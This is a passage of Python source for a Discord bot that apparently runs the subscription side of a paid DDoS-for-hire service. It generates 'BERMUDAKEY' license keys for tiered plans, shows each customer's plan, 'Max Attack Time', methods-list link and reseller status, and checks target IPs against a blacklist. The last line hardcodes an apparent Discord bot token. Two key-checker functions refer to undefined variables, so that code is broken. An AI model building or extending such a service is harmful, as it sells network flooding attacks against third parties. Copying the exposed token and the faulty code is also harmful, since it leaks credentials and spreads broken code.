			thing = 'BERMUDAKEY|' + ''.join(random.choice(string.ascii_letters + string.digits + string.ascii_uppercase) for i in range(35))
			keysa.insert_one({"key": str(thing)})
			await self.author.send(str(thing))
			if b >= e:
				o = keysa.find()
				keya.clear()
				for i in o:
					keya.append(i['key'])
				break
	elif plan.lower() == 'planb':
		e = int(amount)
		b = 0
		await self.author.send('------------PLANB MASS TOKEN GEN------------')
		while b <= e:
			b = b + 1
			thing = 'BERMUDAKEY|' + ''.join(random.choice(string.ascii_letters + string.digits + string.ascii_uppercase) for i in range(35))
			keysb.insert_one({"key": str(thing)})
			await self.author.send(str(thing))
			if b >= e:
				o = keysb.find()
				keyb.clear()
				for i in o:
					keyb.append(i['key'])
				break
	elif plan.lower() == 'planc':
		e = int(amount)
		b = 0
		await self.author.send('------------PLANC MASS TOKEN GEN------------')
		while b <= e:
			b = b + 1
			thing = 'BERMUDAKEY|' + ''.join(random.choice(string.ascii_letters + string.digits + string.ascii_uppercase) for i in range(35))
			keysc.insert_one({"key": str(thing)})
			await self.author.send(str(thing))
			if b >= e:
				o = keysc.find()
				keyc.clear()
				for i in o:
					keyc.append(i['key'])
				break

@bot.command()
async def profile(message):
        user = message.author.id
        print(user)
        embed = discord.Embed(title="Your Profile", color=0x9700f5)
        embed.add_field(name="Username:", value=f"{message.author}", inline=False)
        embed.add_field(name="ID:", value=f"{message.author.id}", inline=False)
        if str(message.author.id) in wledA:
        	embed.add_field(name="Your Plan:", value="Plan A", inline=False)
        if str(message.author.id) in wledB:
        	embed.add_field(name="Your Plan:", value="Plan B", inline=False)
        if str(message.author.id) in wledC:
        	embed.add_field(name="Your Plan:", value="Plan C", inline=False)
        if str(message.author.id) in wledA:
        	embed.add_field(name="Max Attack Time:", value="1200", inline=False)
        if str(message.author.id) in wledB:
        	embed.add_field(name="Max Attack Time:", value="800", inline=False)
        if str(message.author.id) in wledC:
        	embed.add_field(name="Max Attack Time:", value="400", inline=False)
        if str(message.author.id) in wledReseller:
        	embed.add_field(name="Reseller:", value="Yes ✅", inline=False)
        if str(message.author.id) not in wledReseller:
        	embed.add_field(name="Reseller:", value="No 🚫", inline=False)
        if str(message.author.id) in wledA:
        	embed.add_field(name="Your Methods List:", value="[PLAN A METHOD LIST LINK]", inline=False)
        if str(message.author.id) in wledB:
        	embed.add_field(name="Your Methods List:", value="[PLAN B METHOD LIST LINK]", inline=False)  
        if str(message.author.id) in wledC:
        	embed.add_field(name="Your Methods List:", value="[PLAN C METHOD LIST LINK]", inline=False)
        embed.add_field(name="Cooldown:", value="120 Seconds", inline=False) 
        await message.send(embed=embed)

@bot.command()
async def viewips(ctx):
    embed = discord.Embed(title="Blacklisted IP's", 
        color=0x9700f5)
    ips = len(BlacklistedIps)
    embed.add_field(name="Amount", value="▸ "+str(ips), inline=False)
    await ctx.send(embed=embed)

@bot.command()
async def blcheck(ctx,ips):
    plan = discord.Embed(title="Blacklist Checker", 
        color=0x9700f5)
    if str(ips) in BlacklistedIps:
    	plan.add_field(name="Host", value="▸ Is blacklisted 🚫", inline=False)
    if str(ips) not in BlacklistedIps:
    	plan.add_field(name="Host", value="▸ Is NOT blacklisted ✅", inline=False)
    await ctx.send(embed=plan)  

@bot.command()
@has_permissions(ban_members=True)
async def keycheckA(ctx,planakeys):
    plan = discord.Embed(title="Plan A Key Checker", 
        color=0x9700f5)
    if str(planakeys) in keya:
    	plan.add_field(name="Key", value="▸ Is valid ✅", inline=False)
    if str(planakeys) not in keya:
    	plan.add_field(name="Key", value="▸ Is invalid 🚫", inline=False)
    await ctx.send(embed=plan)

@bot.command()
@has_permissions(ban_members=True)
async def keycheckB(ctx,planakeys):
    plan = discord.Embed(title="Plan B Key Checker", 
        color=0x9700f5)
    if str(planbkeys) in keyb:
    	plan.add_field(name="Key", value="▸ Is valid ✅", inline=False)
    if str(planbkeys) not in keyb:
    	plan.add_field(name="Key", value="▸ Is invalid 🚫", inline=False)
    await ctx.send(embed=plan)  

@bot.command()
@has_permissions(ban_members=True)
async def keycheckC(ctx,planakeys):
    plan = discord.Embed(title="Plan C Key Checker", 
        color=0x9700f5)
    if str(planckeys) in keyc:
    	plan.add_field(name="Key", value="▸ Is valid ✅", inline=False)
    if str(planckeys) not in keyc:
    	plan.add_field(name="Key", value="▸ Is invalid 🚫", inline=False)
    await ctx.send(embed=plan)    

bot.run('NzU3NzMwOTI0MDQ0NDg0NjIz.X2kp6g.LF_7phyF956umoKIJBt4vlcfOGI')